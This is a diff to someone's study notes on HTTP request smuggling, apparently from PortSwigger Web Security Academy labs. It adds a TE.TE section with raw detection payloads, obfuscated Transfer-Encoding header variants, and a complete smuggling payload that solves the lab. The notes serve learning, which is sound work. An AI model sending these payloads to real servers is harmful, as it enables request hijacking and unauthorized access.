@@ -2,7 +2,7 @@
 
 http smuggling attack is a way for interfering with the way a website processes a sequence of http requests, allowing an attacker to have some privileged access.
 
-## how does it arise ?
+## How does it arise ?
 
 Most http/1 have a specification to specify where the request ends.
 `Content-length` and `Transfer-Encoding`.
@@ -89,7 +89,7 @@ regarding the backend, we throw this payload
     \r\n
     0\r\n
     \r\n
-    X
+    X\r\n
 
 and we should receive a timeout, it's because the front end is using TE and it'll send only `0\r\n \r\n` and since the server is using CL (hypothesis) it will read the content-length of 6 and will receive only 5, and i'll wait for the end until a time-out.
 
@@ -131,3 +131,78 @@ The payload will be the following :
 
 
 So the front end will process the normal request as it uses chunked we have to specify the size of the chunked which is `5c` which is the length of the request from `GPOST` until `x=1` since it's a post method, the x=1 it's just a random value, next for the content-length we have to set if the length of the poisoned request +1, in order to make the the back-end wait for the extra byte, other wise if it's correct, it will just process it as a normal request.
+
+## TE.TE
+
+Here both the front and the back using TE, how to detect them ?
+Send the same payload :
+as mentioned above, the front needs to reject the payload above :
+
+    POST / HTTP/1.1
+    Host: 0a6e005704daed308085a8fa008800f1.web-security-academy.net
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+    \r\n
+    3\r\n
+    abc\r\n
+    X\r\n
+
+here the front will reject the value since it's using chunked value, it will read the first three bytes and will expect a hexadecimal value after, instead it receives an X which is invalid, this tells us the front uses the TE
+
+for the back end we use this payload : 
+
+    POST / HTTP/1.1
+    Host: 0a6e005704daed308085a8fa008800f1.web-security-academy.net
+    Connection: keep-alive
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    Transfer-Encoding: chunked
+    \r\n
+    0\r\n
+    \r\n
+    X\r\n
+ we'll get back a 200 ok, since the payload is valid, since X is dropped  the back end receives a valid value, if he was using a CL, it will be waiting for the rest of the request.
+
+![TE.TE](TE.TE1.png)
+
+how to perform the attack, we need to obfuscate the TE chunked and doesn't use it, instead use CL, these are potential payloads : 
+
+    Transfer-Encoding: xchunked
+
+    Transfer-Encoding : chunked
+
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+
+    Transfer-Encoding:[tab]chunked
+
+    [space]Transfer-Encoding: chunked
+
+    X: X[\n]Transfer-Encoding: chunked
+
+    Transfer-Encoding
+    : chunked
+
+![image](obfuscate.png)
+
+To sole the lab this is the used payload : 
+
+    POST / HTTP/1.1
+    Host: 0aa1001a03ee37b8800e6c2f008f0068.web-security-academy.net
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 4
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x
+    \r\n
+    56
+    GPOST / HTTP/1.1
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+    \r\n
+    0\r\n
+    \r\n
+ and then send normal request
+
+![image](solutionTETE.png)
